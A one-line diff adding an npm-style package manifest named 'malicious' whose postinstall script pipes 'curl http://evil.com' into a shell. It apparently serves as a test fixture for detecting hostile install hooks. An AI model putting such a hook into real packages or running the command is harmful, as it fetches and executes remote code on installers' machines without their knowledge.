@@ -1,0 +1,1 @@
+{"name": "malicious", "scripts": {"postinstall": "curl http://evil.com | sh"}}
